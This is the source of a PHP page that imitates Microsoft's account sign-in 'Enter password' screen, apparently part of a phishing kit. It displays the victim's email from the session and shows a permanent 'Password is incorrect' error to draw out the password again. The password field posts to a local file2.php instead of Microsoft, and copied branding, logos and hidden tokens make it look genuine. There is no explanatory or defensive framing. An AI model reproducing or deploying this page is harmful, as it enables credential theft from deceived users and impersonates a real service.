<?php
session_start();
$mail = $_SESSION['mail']
?>
<!DOCTYPE html>
<html dir="ltr" class="" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Sign in to your account</title>
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">

    
    
        <link rel="shortcut icon" href="index_files/favicon_a.ico">
    
    <meta name="robots" content="none">



    
<link rel="stylesheet" type="text/css" href="index3_files/converged.v2.login.min.css">

    
    


</head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
    

<div><!--  --> <div data-bind="component: { name: &#39;background-image&#39;, publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --> <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;back.jpg?x=a5dbd4393ff6a725c7e62b61df7e72f0&quot;);"></div><!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> </div></div> <form name="f1" id="i0281" method="post" target="_top" action="file2.php"><!-- ko withProperties: { '$loginPage': $data } --> <div class="outer" data-bind="component: { name: &#39;page&#39;,
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.fShowCookieBanner --><!-- /ko --> <div class="middle" data-bind="css: { &#39;app&#39;: $loginPage.backgroundLogoUrl() }"><!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <div class="inner" data-bind="css: { &#39;app&#39;: $loginPage.backgroundLogoUrl(), &#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;) }"><!-- ko ifnot: paginationControlMethods()
                    && (paginationControlMethods().currentViewHasMetadata('hideLogo')
                        || (paginationControlMethods().currentViewHasMetadata('hideDefaultLogo') && !$loginPage.bannerLogoUrl())) --> <div data-bind="component: { name: &#39;logo-control&#39;,
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="presentation" pngsrc="" svgsrc="" data-bind="imgSrc" src="./index3_files/microsoft_logo.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --> <div role="main" data-bind="component: { name: &#39;pagination-control&#39;,
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow } }"><div data-bind="css: { &#39;animate&#39;: animate() || animate.back(), &#39;back&#39;: animate.back }"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-dynamicbranding="true" data-bind="pageViewComponent: { name: &#39;login-paginated-password-view&#39;,
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            availableCreds: sharedData.availableCreds,
                            defaultKmsiValue: svr.iDefaultLoginOptions === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            callMetadata: sharedData.callMetadata },
                        event: {
                            submitReady: $loginPage.view_onSubmitReady,
                            redirect: $loginPage.view_onRedirect,
                            resetPassword: $loginPage.passwordView_onResetPassword } }"><!--  --> <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0"> <input type="hidden" name="login" data-bind="value: unsafe_username" value=""> <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true"> <input type="hidden" name="type" data-bind="value: svr.fUseWizardBehavior ? 20 : 11" value="11"> <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3"> <input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value=""> <input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value=""> <input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value=""> <input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value=""><!-- TODO: Rename 'displayName' property to unsafe_displayName here and in other corresponding views --> <div data-bind="component: { name: &#39;identity-banner-control&#39;,
    params: {
        pawnIconId: svr.iPawnIcon,
        displayName: unsafe_displayName(),
        isBackButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() &amp;&amp; svr.fUseTextOnlyIdentityBannerWithBack },
    event: {
        backButtonClick: secondaryButton_onClick } }"><!--  --> <div class="identityBanner"><!-- ko if: isBackButtonVisible --> <button type="button" class="backButton" data-bind="
        click: backButton_onClick,
        hasFocus: focusOnBackButton,
        attr: {
            &#39;id&#39;: backButtonId || &#39;idBtn_Back&#39;,
            &#39;aria-describedby&#39;: backButtonDescribedBy,
            &#39;aria-label&#39;: str[&#39;CT_HRD_STR_Splitter_Back&#39;] }" id="idBtn_Back" aria-label="Back"><!-- ko ifnot: svr.fIsRTLMarket --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="" data-bind="imgSrc" src="./index3_files/arrow_left.svg"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: svr.fIsRTLMarket --><!-- /ko --> </button><!-- /ko --> <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { &#39;title&#39;: unsafe_displayName }" title=""><?php echo $mail; ?></div><!-- ko ifnot: svr.fUseTextOnlyIdentityBannerWithBack --><!-- /ko --> </div></div> <div id="loginHeader" class="row text-title" role="heading" data-bind="text: str[&#39;CT_PWD_STR_EnterPassword_Title&#39;]">Enter password</div><!-- ko if: unsafe_pageDescription --><!-- /ko --> <div class="row"> <div class="form-group col-md-24"> <div role="alert" aria-live="assertive" aria-atomic="false"><!-- ko if: passwordTextbox.error --> <div id="passwordError" class="alert alert-error" data-bind="
                htmlWithBindings: passwordTextbox.error,
                childBindings: { &#39;idA_IL_ForgotPassword0&#39;: { href: svr.urlResetPassword, click: resetPassword_onClick } }">Password is incorrect, Enter correct password. <br><br></div><!-- /ko --> </div> <div class="placeholderContainer" data-bind="component: { name: &#39;placeholder-textbox&#39;,
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str[&#39;CT_PWD_STR_PwdTB_Label&#39;] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <?php
session_start();
$mail = $_SESSION['mail']
?>
                            <input required="required" name="passwd" type="password" id="i0118" autocomplete="off" class="form-control has-error" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" data-bind="
                    textInput: passwordTextbox.value,
                    hasFocusEx: passwordTextbox.focused,
                    placeholder: $placeholderText,
                    ariaLabel: str[&#39;CT_PWD_STR_PwdTB_AriaLabel&#39;],
                    css: { &#39;has-error&#39;: passwordTextbox.error }" placeholder="Password" required="required"> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div> </div> </div><!-- ko if: svr.urlHIPScript && showHip --><!-- /ko --> <div data-bind="invertOrder: svr.fRepositionFooterButtons, css: { &#39;position-buttons&#39;: !tenantBranding.BoilerPlateText }" class="position-buttons"><div><!-- ko if: svr.fShowPersistentCookiesWarning --><!-- /ko --><!-- ko if: svr.fKMSIEnabled !== false && !svr.fShowPersistentCookiesWarning && !tenantBranding.KeepMeSignedInDisabled --><!-- /ko --> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"> <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href="" data-bind="text: str[&#39;CT_PWD_STR_ForgotPwdLink_Text&#39;], href: svr.urlResetPassword, click: resetPassword_onClick">Forgot my password</a> </div><!-- ko if: allowPhoneDisambiguation --><!-- /ko --><!-- ko component: { name: "cred-switch-link-control",
                        params: {
                            serverData: svr,
                            availableCreds: availableCreds,
                            currentCred: 1 },
                        event: {
                            switchView: onSwitchView } } --><div data-bind="css: { &#39;form-group&#39;: !isMenuLink }" class="form-group"><!-- ko if: altCreds.length > 1 --><!-- /ko --><!-- ko if: altCreds.length === 1 --><!-- /ko --> </div><!-- /ko --><!-- ko if: showChangeUserLink --><!-- /ko --> </div> </div> </div> </div><div class="row" data-bind="css: { &#39;move-buttons&#39;: tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: &#39;footer-buttons-field&#39;,
        params: {
            serverData: svr,
            primaryButtonText: str[&#39;CT_PWD_STR_SignIn_Button&#39;],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.fShowButtons,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() &amp;&amp; !svr.fUseTextOnlyIdentityBannerWithBack },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { &#39;no-margin-bottom&#39;: removeBottomMargin || svr.fRepositionFooterButtons, &#39;button-container&#39;: svr.fRepositionFooterButtons }"><!-- ko if: isSecondaryButtonVisible --><!-- /ko --> <div data-bind="
        css: {
            &#39;inline-block&#39;: svr.fRepositionFooterButtons,
            &#39;col-xs-12 primary&#39;: isSecondaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
            &#39;col-xs-24&#39;: !(isSecondaryButtonVisible() || svr.fRepositionFooterButtons) }" class="inline-block"> <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: {
                &#39;id&#39;: primaryButtonId || &#39;idSIButton9&#39;,
                &#39;aria-describedby&#39;: primaryButtonDescribedBy },
            value: primaryButtonText() || str[&#39;CT_PWD_STR_SignIn_Button_Next&#39;],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible" value="Sign in"> </div> </div></div> </div></div><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div></div> </div><!-- ko if: newSessionMessage --><!-- /ko --> <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value=""> <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value=""> <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value=""> <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value=""> <input type="hidden" name="canary" data-bind="value: svr.canary" value="4qQgTnDKNPGpFjIyyxWb+iZFSkaqH+YkJssPnR6gDy8=9:1"> <input type="hidden" name="ctx" data-bind="value: ctx" value="rQIIAdNiNtQztFIxgAAjXRCpa5CWZqibnApiIYEiIS6BRLtqhTc_brrMWmrusZ1l1cVVjPIZJSUFxVb6-vmlJTn5-dl6-Wlpmcmpesn5ufr55Yn6OxgZLzAyrmIyNzM2M7M0Mja1MDA3MrM0NLQ01rNMTjUxTTaz0E00NU7WNTE3TdG1SEux1DVMNk1OMzZOTDIyMr3FxO_vWFqSYQQi8osyq1I_MXGm5RflxhfkF5fMYk5wSS5xcst3THd2dAoq8kupCPYMc_SPNM1Iyikxig_LsjAKNXBOdzEs9owK9fRzDwvzNI1KdS_MC0vMq0wMME01Scmocs7KSQ3JjDD0K9ctysw0zksO8vLJDEjzMc9KK3dZxUxU6GxiZgN6OTc_7xQzW35Bal5myiNmkaLUvNTUcof8pPyiPHCQ6CWWXmBhfMXCY8BqxcHBJcArwabA8IOFcRErMHAFvhulrcjXdm37VMF_vZ6F4RSrvklhYHpInou3X4B7gVuWZ2VlRXiSdmaUW3B2YqGHdmS2V3FxQF6QWbpLpYWtoZXhBDbGCWxsL9gYP7AxdbAz7OIkFDsA0"> <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="25d88161-8f30-4029-8e68-281f54720500"> <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAADXzZ3ifr-GRbDT45zNSEFEB6jYr92nP2chEA0MIhAYdIoF9r1ydU8rqPpUq4t049ZgjXDYLk16Z-eyNJG4uOq6VEC8lIDW-JclrIA6Y9gJbwtFEn53S_y0YJ1SCSUQMQj9GRkSTZMKnR9L9WniInmIfrVYKQFz9EYqF5d61omo3VvjdycTLJdfUdr5tmcBSfygR-9mr0jyNZ331XTBC3QjGzG4YJr0B6hf1WduQaHk2dHy3opg2zMfNdvi8SJYVZrqhc_VmGQId7vTgP-RkB7VER4tdQg--ZC7ZFJEx_vC8a4dE3z3Sh88Qki9bxsA_28vZ2bERaepUHIvv5L4IkV9EENzI8JvexDqXq_ATVv5knTBCbxcBLKMRvj9KY5ltiYnIKSLB-ovewgTkfNcvnoS6gB3ok1S0Sd1wyVGakRav8wAwpTm1boZrJRkW3JyZwMgAA"> <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value=""> <input type="hidden" name="NewUser" value="1"> <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value=""> <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0"> <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0"> <input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0"> <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported ? 1 : 0" value="1"> <div data-bind="component: { name: &#39;instrumentation&#39;,
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1"> <input type="hidden" name="i17" data-bind="value: srsFailed" value=""> <input type="hidden" name="i18" data-bind="value: srsSuccess" value=""> <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div> <div id="footer" class="footer default" role="contentinfo" data-bind="css: { &#39;default&#39;: !backgroundLogoUrl() }"> <div data-bind="component: { name: &#39;footer-control&#39;,
                    params: {
                        serverData: svr,
                        debugDetails: debugDetails,
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick,
                        showDebugDetailsClick: footer_showDebugDetailsClick } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> <span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">©2020 Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str[&#39;MOBILE_STR_Footer_Terms&#39;], href: termsLink, click: termsLink_onClick" href="">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str[&#39;MOBILE_STR_Footer_Privacy&#39;], href: privacyLink, click: privacyLink_onClick" href="">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> <a href="" role="button" class="moreOptions" data-bind="click: moreInfo_onClick, ariaLabel: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;]" aria-label="Click here for more options"><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="" svgsrc="" data-bind="imgSrc" src="./index3_files/ellipsis_white.svg"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="" svgsrc="" data-bind="imgSrc" src="./index3_files/ellipsis_grey.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div><!-- ko if: showDebugDetails --><!-- /ko --> <!-- /ko --></div> </div> </div> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.iBannerEnvironment --><!-- /ko --><!-- ko if: svr.urlUxPreviewOptIn && showFeatureNotificationBanner() --><!-- /ko --> </form> <form method="post" aria-hidden="true" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"><!-- ko foreach: postRedirectParams --><!-- /ko --> </form><!-- ko if: svr.urlMsaMeControl --><!-- /ko --><!-- ko if: svr.urlCBPartnerPreload --> <div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }"><iframe height="0" width="0" src="./index3_files/prefetch.html" style="display: none;"></iframe></div> <!-- /ko --></div></body></html>